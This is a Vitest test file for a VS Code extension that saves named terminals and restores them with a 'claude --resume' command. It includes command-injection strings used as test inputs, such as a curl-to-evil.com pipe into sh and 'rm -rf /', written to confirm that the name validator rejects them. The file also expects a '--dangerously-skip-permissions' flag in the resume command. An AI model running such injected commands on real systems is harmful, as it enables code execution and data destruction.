import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import { TerminalManager, isValidSessionName } from "../src/terminalManager";
import { window } from "vscode";

function makeTmpDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), "cc-persist-test-"));
}

function makeLog() {
  return window.createOutputChannel("test") as ReturnType<typeof window.createOutputChannel>;
}

describe("TerminalManager", () => {
  let stateDir: string;
  let signalBaseDir: string;
  let startDir: string;
  let tm: TerminalManager;

  beforeEach(() => {
    stateDir = makeTmpDir();
    signalBaseDir = makeTmpDir();
    startDir = "/Users/test/my-project";
    tm = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
  });

  afterEach(() => {
    tm.disposeAll();
    fs.rmSync(stateDir, { recursive: true, force: true });
    fs.rmSync(signalBaseDir, { recursive: true, force: true });
  });

  describe("state persistence", () => {
    it("saves and loads empty state", () => {
      tm.saveState();
      const state = tm.loadState();
      expect(state.version).toBe(1);
      expect(state.terminals).toEqual([]);
    });

    it("only persists renamed terminals", () => {
      const t1 = tm.createTerminal("unrenamed");
      const t2 = tm.createTerminal("also-unrenamed");
      tm.saveState();
      const state = tm.loadState();
      expect(state.terminals).toHaveLength(0);
    });

    it("saves and loads renamed terminals", () => {
      const t1 = tm.createTerminal();
      const t2 = tm.createTerminal();
      tm.renameTerminal(t1, "warroom");
      tm.renameTerminal(t2, "alan");
      tm.saveState();

      // Create a new manager to load from disk
      const tm2 = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
      const state = tm2.loadState();
      expect(state.terminals).toHaveLength(2);
      expect(state.terminals[0]).toEqual({ name: "warroom", index: 0 });
      expect(state.terminals[1]).toEqual({ name: "alan", index: 1 });
      tm2.disposeAll();
    });

    it("returns empty state when file missing", () => {
      const state = tm.loadState();
      expect(state.terminals).toEqual([]);
    });

    it("returns empty state when file corrupted", () => {
      fs.writeFileSync(path.join(stateDir, "state.json"), "{{bad json");
      const state = tm.loadState();
      expect(state.terminals).toEqual([]);
    });
  });

  describe("terminal creation", () => {
    it("creates terminal with monotonically increasing index", () => {
      const t1 = tm.createTerminal("first");
      const t2 = tm.createTerminal("second");
      expect(tm.getIndex(t1)).toBe(0);
      expect(tm.getIndex(t2)).toBe(1);
    });

    it("creates terminal with env vars", () => {
      const t = tm.createTerminal();
      const opts = (t as any).creationOptions;
      expect(opts.env.DTACH_SIGNAL_DIR).toBeDefined();
      expect(opts.env.DTACH_SOCKET_INDEX).toBe("0");
    });

    it("does not set name on created terminal (Claude owns the title)", () => {
      const t = tm.createTerminal();
      const opts = (t as any).creationOptions;
      expect(opts.name).toBeUndefined();
    });
  });

  describe("terminal tracking", () => {
    it("tracks terminals by index", () => {
      const t = tm.createTerminal("test");
      expect(tm.getIndex(t)).toBe(0);
      expect(tm.isTracked(t)).toBe(true);
    });

    it("shows terminal by index", () => {
      const t = tm.createTerminal("test");
      const showSpy = vi.spyOn(t, "show");
      tm.showTerminal(0);
      expect(showSpy).toHaveBeenCalled();
    });

    it("getSavedName returns name for renamed terminal", () => {
      const t = tm.createTerminal();
      tm.renameTerminal(t, "warroom");
      expect(tm.getSavedName(0)).toBe("warroom");
    });
  });

  describe("terminal close handling", () => {
    it("removes terminal from tracking on close", () => {
      const t = tm.createTerminal("test");
      expect(tm.isTracked(t)).toBe(true);
      tm.handleTerminalClosed(t);
      expect(tm.isTracked(t)).toBe(false);
    });

    it("saves state on user-initiated close", () => {
      const t1 = tm.createTerminal();
      const t2 = tm.createTerminal();
      tm.renameTerminal(t1, "first");
      tm.renameTerminal(t2, "second");
      tm.saveState();
      // exitStatus.reason = Process (default in mock) = user closed
      tm.handleTerminalClosed(t1);
      const state = tm.loadState();
      expect(state.terminals).toHaveLength(1);
      expect(state.terminals[0].name).toBe("second");
    });

    it("fires onTerminalClosed callback", () => {
      const callback = vi.fn();
      tm.setOnTerminalClosed(callback);
      const t = tm.createTerminal("test");
      tm.handleTerminalClosed(t);
      expect(callback).toHaveBeenCalledWith(0);
    });

    it("preserves state on disk during shutdown", () => {
      const t = tm.createTerminal();
      tm.renameTerminal(t, "test");
      tm.saveState();
      // Simulate shutdown: setDisposing before terminal close events
      tm.setDisposing();
      tm.handleTerminalClosed(t);
      // Terminal still tracked (early return skips cleanup)
      expect(tm.isTracked(t)).toBe(true);
      // State on disk preserved
      const state = tm.loadState();
      expect(state.terminals).toHaveLength(1);
      expect(state.terminals[0].name).toBe("test");
    });
  });

  describe("restore", () => {
    it("creates terminals from saved state", () => {
      const t1 = tm.createTerminal();
      const t2 = tm.createTerminal();
      tm.renameTerminal(t1, "warroom");
      tm.renameTerminal(t2, "alan");
      tm.saveState();
      tm.disposeAll();

      // New manager restores
      const tm2 = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
      const terminals = tm2.restoreTerminals();
      expect(terminals).toHaveLength(2);
      expect(tm2.getSavedName(0)).toBe("warroom");
      expect(tm2.getSavedName(1)).toBe("alan");
      tm2.disposeAll();
    });

    it("sends claude --resume command for each terminal", () => {
      const t = tm.createTerminal();
      tm.renameTerminal(t, "warroom");
      tm.saveState();
      tm.disposeAll();

      const sendTextCalls: string[] = [];
      const origCreateTerminal = window.createTerminal;
      (window as any).createTerminal = (opts: any) => {
        const t = origCreateTerminal(opts);
        t.sendText = (text: string) => sendTextCalls.push(text);
        return t;
      };

      const tm2 = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
      tm2.restoreTerminals();
      expect(sendTextCalls.some(c => c.includes("claude --dangerously-skip-permissions --resume 'warroom'"))).toBe(true);

      (window as any).createTerminal = origCreateTerminal;
      tm2.disposeAll();
    });

    it("skips terminals with unsafe names on restore", () => {
      const state = { version: 1, terminals: [
        { name: "'; curl evil.com | sh; echo '", index: 0 },
        { name: "valid-session", index: 1 },
      ]};
      fs.mkdirSync(stateDir, { recursive: true });
      fs.writeFileSync(path.join(stateDir, "state.json"), JSON.stringify(state));

      const tm2 = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
      const terminals = tm2.restoreTerminals();
      expect(terminals).toHaveLength(1);
      expect(tm2.getSavedName(1)).toBe("valid-session");
      tm2.disposeAll();
    });

    it("preserves indices on restore", () => {
      const t1 = tm.createTerminal();
      const t2 = tm.createTerminal();
      tm.renameTerminal(t1, "warroom");
      tm.renameTerminal(t2, "alan");
      tm.saveState();
      tm.disposeAll();

      const tm2 = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
      const terminals = tm2.restoreTerminals();
      expect(tm2.getIndex(terminals[0])).toBe(0);
      expect(tm2.getIndex(terminals[1])).toBe(1);
      tm2.disposeAll();
    });

    it("returns empty array when no saved state", () => {
      const terminals = tm.restoreTerminals();
      expect(terminals).toEqual([]);
    });
  });

  describe("rename", () => {
    it("renameTerminal stores session name", () => {
      const t = tm.createTerminal("Terminal 1");
      tm.renameTerminal(t, "warroom");
      expect(tm.getSessionName(t)).toBe("warroom");
    });

    it("saveState uses stored session name over terminal.name", () => {
      const t = tm.createTerminal("Terminal 1");
      tm.renameTerminal(t, "warroom");
      tm.saveState();
      const state = tm.loadState();
      expect(state.terminals[0].name).toBe("warroom");
    });

    it("unrenamed terminal is not persisted", () => {
      tm.createTerminal("my-session");
      tm.saveState();
      const state = tm.loadState();
      expect(state.terminals).toHaveLength(0);
    });

    it("renameTerminal rejects invalid names", () => {
      const t = tm.createTerminal("Terminal 1");
      const result = tm.renameTerminal(t, "'; rm -rf /");
      expect(result).toBe(null);
      expect(tm.getSessionName(t)).toBeUndefined();
    });

    it("renameTerminal adopts untracked terminal", () => {
      const fakeTerminal = window.createTerminal({ name: "untracked" }) as any;
      const result = tm.renameTerminal(fakeTerminal, "warroom");
      expect(result).toBe("warroom");
      expect(tm.isTracked(fakeTerminal)).toBe(true);
      expect(tm.getSessionName(fakeTerminal)).toBe("warroom");
      expect(tm.getIndex(fakeTerminal)).toBeDefined();
    });

    it("renameTerminal returns base name when unique", () => {
      const t = tm.createTerminal("Terminal 1");
      expect(tm.renameTerminal(t, "warroom")).toBe("warroom");
    });

    it("renameTerminal appends -2 on collision", () => {
      const t1 = tm.createTerminal("Terminal 1");
      const t2 = tm.createTerminal("Terminal 2");
      tm.renameTerminal(t1, "warroom");
      expect(tm.renameTerminal(t2, "warroom")).toBe("warroom-2");
      expect(tm.getSessionName(t2)).toBe("warroom-2");
    });

    it("renameTerminal increments counter past existing suffixes", () => {
      const t1 = tm.createTerminal("Terminal 1");
      const t2 = tm.createTerminal("Terminal 2");
      const t3 = tm.createTerminal("Terminal 3");
      tm.renameTerminal(t1, "warroom");
      tm.renameTerminal(t2, "warroom");
      expect(tm.renameTerminal(t3, "warroom")).toBe("warroom-3");
    });

    it("renameTerminal to same name on same terminal is no-op", () => {
      const t = tm.createTerminal("Terminal 1");
      tm.renameTerminal(t, "warroom");
      expect(tm.renameTerminal(t, "warroom")).toBe("warroom");
    });

    it("renameTerminal fills counter gap", () => {
      const t1 = tm.createTerminal("Terminal 1");
      const t2 = tm.createTerminal("Terminal 2");
      const t3 = tm.createTerminal("Terminal 3");
      tm.renameTerminal(t1, "warroom");
      tm.renameTerminal(t2, "warroom-3");
      expect(tm.renameTerminal(t3, "warroom")).toBe("warroom-2");
    });

    it("renameTerminal treats explicit suffixed base as its own name", () => {
      const t1 = tm.createTerminal("Terminal 1");
      const t2 = tm.createTerminal("Terminal 2");
      tm.renameTerminal(t1, "warroom-2");
      expect(tm.renameTerminal(t2, "warroom-2")).toBe("warroom-2-2");
    });

    it("getSavedName returns collision-resolved name", () => {
      const t1 = tm.createTerminal("Terminal 1");
      const t2 = tm.createTerminal("Terminal 2");
      tm.renameTerminal(t1, "warroom");
      tm.renameTerminal(t2, "warroom");
      const idx2 = tm.getIndex(t2)!;
      expect(tm.getSavedName(idx2)).toBe("warroom-2");
    });

    it("renameTerminal truncates base to keep resolved name within 64-char limit", () => {
      const t1 = tm.createTerminal("Terminal 1");
      const t2 = tm.createTerminal("Terminal 2");
      const longBase = "a".repeat(64);
      tm.renameTerminal(t1, longBase);
      const resolved = tm.renameTerminal(t2, longBase);
      expect(resolved).not.toBeNull();
      expect(resolved!.length).toBeLessThanOrEqual(64);
      expect(resolved).toMatch(/-2$/);
    });

    it("adopted terminal appears in saveState", () => {
      const fakeTerminal = window.createTerminal({ name: "untracked" }) as any;
      tm.renameTerminal(fakeTerminal, "warroom");
      tm.saveState();
      const state = tm.loadState();
      expect(state.terminals).toHaveLength(1);
      expect(state.terminals[0].name).toBe("warroom");
    });

    it("renameTerminal still rejects invalid names on untracked terminal", () => {
      const fakeTerminal = window.createTerminal({ name: "untracked" }) as any;
      const result = tm.renameTerminal(fakeTerminal, "'; rm -rf /");
      expect(result).toBe(null);
      expect(tm.isTracked(fakeTerminal)).toBe(false);
    });

    it("restore populates session name map", () => {
      tm.createTerminal("warroom");
      tm.renameTerminal(
        [...(tm as any).terminalToIndex.keys()][0],
        "warroom",
      );
      tm.saveState();
      tm.disposeAll();

      const tm2 = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
      const terminals = tm2.restoreTerminals();
      expect(tm2.getSessionName(terminals[0])).toBe("warroom");
      tm2.disposeAll();
    });

    it("handleTerminalClosed cleans up session name", () => {
      const t = tm.createTerminal("Terminal 1");
      tm.renameTerminal(t, "warroom");
      tm.handleTerminalClosed(t);
      expect(tm.getSessionName(t)).toBeUndefined();
    });
  });

  describe("workspace metadata", () => {
    it("writes workspace.json to signal base dir", () => {
      tm.writeWorkspaceMetadata();
      const meta = JSON.parse(
        fs.readFileSync(path.join(signalBaseDir, "workspace.json"), "utf8")
      );
      expect(meta.path).toBe(startDir);
    });
  });
});

describe("isValidSessionName", () => {
  it("accepts simple names", () => {
    expect(isValidSessionName("warroom")).toBe(true);
    expect(isValidSessionName("my-session")).toBe(true);
    expect(isValidSessionName("task_123")).toBe(true);
    expect(isValidSessionName("war room")).toBe(true);
    expect(isValidSessionName("v2.0")).toBe(true);
  });

  it("rejects shell metacharacters", () => {
    expect(isValidSessionName("'; rm -rf /; echo '")).toBe(false);
    expect(isValidSessionName("$(whoami)")).toBe(false);
    expect(isValidSessionName("test`id`")).toBe(false);
    expect(isValidSessionName("foo;bar")).toBe(false);
    expect(isValidSessionName("a|b")).toBe(false);
    expect(isValidSessionName("a&b")).toBe(false);
  });

  it("rejects empty and overly long names", () => {
    expect(isValidSessionName("")).toBe(false);
    expect(isValidSessionName("a".repeat(65))).toBe(false);
  });
});
